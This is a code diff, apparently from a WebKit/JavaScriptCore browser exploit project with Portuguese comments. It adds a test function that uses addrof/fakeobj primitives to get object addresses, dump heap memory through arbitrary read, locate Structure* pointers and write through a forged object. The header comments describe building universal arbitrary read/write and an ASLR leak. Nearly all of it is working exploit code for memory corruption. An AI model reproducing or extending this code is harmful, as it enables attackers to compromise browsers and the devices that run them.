@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v126 - R60 Final - AGORA COM ARB R/W UNIVERSAL VIA FAKE ARRAYBUFFER)
+// js/script3/testArrayBufferVictimCrash.mjs (v127 - R60 Final - AGORA COM ARB R/W UNIVERSAL VIA FAKE ARRAYBUFFER)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
@@ -21,7 +21,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v126_R60_ARB_RW_UNIVERSAL_HARDCODED_STRUCTURE";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v127_R60_ARB_RW_UNIVERSAL_HARDCODED_STRUCTURE";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -261,7 +261,154 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
 }
 
 
-// Moved to testArrayBufferVictimCrash.mjs and exported
+// Exportar a função de teste isolado para ser chamada por main.mjs
+export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, pauseFn, JSC_OFFSETS_PARAM, isAdvancedInt64ObjectFn) {
+    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump_from_script3';
+    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA do objeto ---`, 'test', FNAME);
+
+    let addrof_success = false;
+    let fakeobj_success = false;
+    let rw_test_on_fakeobj_success = false;
+    let structure_ptr_found = false;
+
+    try {
+        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
+        initCoreAddrofFakeobjPrimitives();
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- Teste addrof_core e fakeobj_core ---
+        const TEST_VAL_P1 = 0x11223344;
+        const TEST_VAL_P2 = 0xAABBCCDD;
+        const TEST_VAL_P3_LOW = 0xDEADBEEF;
+        const TEST_VAL_P3_HIGH = 0xCAFE0000; 
+        const test_object_to_dump = {
+            a: 0xAAAAAAAA,
+            b: 0xBBBBBBBB,
+            c: 0xCCCCCCCC,
+            d: 0xDDDDDDDD,
+            val_marker_1: 0x11112222, 
+            val_marker_2: 0x33334444,
+            val_ptr_candidate_1: {}, 
+            val_ptr_candidate_2: [], 
+            val_float_1: 123.456, 
+            val_float_2: 789.012,
+            val_int_large: 0x1234567890ABCDEFn, 
+            val_string_short: "ABCDEFGH", 
+            val_string_long: "This is a longer string that might be allocated out-of-line."
+        };
+
+        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump, (key, value) => typeof value === 'bigint' ? `0x${value.toString(16)}n` : value)}`, 'info', FNAME);
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        logFn(`Obtendo endereço do objeto de teste para dump usando addrof_core...`, 'info', FNAME);
+        const object_addr = addrof_core(test_object_to_dump);
+        logFn(`Endereço retornado por addrof_core (untagged): ${object_addr.toString(true)}`, 'leak', FNAME);
+
+        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
+            logFn(`ERRO: addrof_core retornou endereço inválido para test_object_to_dump.`, 'error', FNAME);
+            throw new Error("addrof_core returned invalid address.");
+        }
+        addrof_success = true; 
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- DUMP DE MEMÓRIA DO OBJETO ---
+        logFn(`--- INICIANDO DUMP DE MEMÓRIA do objeto ${object_addr.toString(true)} ---`, 'subtest', FNAME);
+        const DUMP_SIZE = 0x200; 
+        let dump_log = `\n--- DUMP DO OBJETO EM ${object_addr.toString(true)} ---\n`;
+        dump_log += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
+        dump_log += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;
+
+        for (let offset = 0; offset < DUMP_SIZE; offset += 8) { 
+            try {
+                const current_read_addr = object_addr.add(offset);
+                const val = await arb_read(current_read_addr, 8); 
+                let guess = "";
+
+                if (isAdvancedInt64ObjectFn(val)) { 
+                    if (val.equals(AdvancedInt64.Zero)) {
+                        guess = "Zero/Null";
+                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
+                        guess = "NaN (JS Empty)"; 
+                    } else if (val.high() === 0) {
+                        guess = `Possible small int or low ptr: ${val.low()}`;
+                    } else {
+                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
+                            guess = `*** Structure* PTR (expected) ***: ${val.toString(true)}`;
+                        } else if (offset === JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET) {
+                            guess = `*** BUTTERFLY PTR (expected) ***: ${val.toString(true)}`;
+                        } else if (val.low() === TEST_VAL_P1 && val.high() === 0) { 
+                            guess = `*** P1 FOUND (Int32) ***: ${TEST_VAL_P1}`;
+                        } else if (val.low() === TEST_VAL_P2 && val.high() === 0) { 
+                            guess = `*** P2 FOUND (Int32) ***: ${TEST_VAL_P2}`;
+                        } else if (val.low() === TEST_VAL_P3_LOW && val.high() === TEST_VAL_P3_HIGH) { 
+                             guess = `*** P3 FOUND (AdvInt64) ***: 0x${TEST_VAL_P3_HIGH.toString(16)}_${TEST_VAL_P3_LOW.toString(16)}`;
+                        } else if (val.low() === 0x11112222 && val.high() === 0) { 
+                            guess = `*** Marker 1: 0x11112222 ***`;
+                        } else if (val.low() === 0x33334444 && val.high() === 0) { 
+                            guess = `*** Marker 2: 0x33334444 ***`;
+                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) { 
+                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
+                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
+                        } else if (val.high() === 0x405E0000 && val.low() === 0x4d2c8f5c) { 
+                            guess = `Float64: ${val.toNumber()}`; 
+                        }
+                    }
+                } else {
+                    guess = `Non-Int64 (Typeof: ${typeof val}): ${String(val)}`; 
+                }
+
+                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;
+
+            } catch (e_dump) {
+                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
+                logFn(`[${FNAME}] ERRO durante dump no offset 0x${offset.toString(16)}: ${e_dump.message}`, 'error', FNAME);
+            }
+        }
+        logFn(dump_log, 'leak', FNAME);
+        logFn(`--- FIM DO DUMP DE MEMÓRIA ---`, 'subtest', FNAME);
+        await pauseFn(LOCAL_LONG_PAUSE * 2); 
+
+        // --- Leitura da Structure* após o dump ---
+        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto original...`, 'info', FNAME);
+        const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const structure_ptr_val = await arb_read(structure_ptr_addr, 8); 
+        logFn(`Valor lido no offset da Structure* do objeto original: ${structure_ptr_val.toString(true)}`, 'leak', FNAME);
+
+        if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
+            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN para objeto original. **O offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} PODE NÃO SER O CORRETO PARA Structure* neste tipo de objeto.** Analise o dump!`, 'warn', FNAME);
+            structure_ptr_found = false; 
+        } else {
+            logFn(`SUCESSO PARCIAL: Leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, 'good', FNAME);
+            structure_ptr_found = true;
+        }
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- Verificação funcional de fakeobj_core (parte já existente e testada) ---
+        const faked_object_test = fakeobj_core(object_addr);
+        if (faked_object_test && typeof faked_object_test === 'object') {
+            fakeobj_success = true;
+            const original_val_a = test_object_to_dump.a;
+            faked_object_test.a = 0xDEC0DE00;
+            if (test_object_to_dump.a === 0xDEC0DE00) {
+                rw_test_on_fakeobj_success = true;
+            }
+            test_object_to_dump.a = original_val_a; 
+        }
+
+    } catch (e) {
+        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME);
+        addrof_success = false;
+        fakeobj_success = false;
+        rw_test_on_fakeobj_success = false;
+        structure_ptr_found = false;
+    } finally {
+        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, 'test', FNAME);
+        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (no offset 0x8): ${structure_ptr_found}`, 'info', FNAME);
+    }
+    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success && structure_ptr_found;
+}
+
+
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBuffer m_vector) ---`, "test");
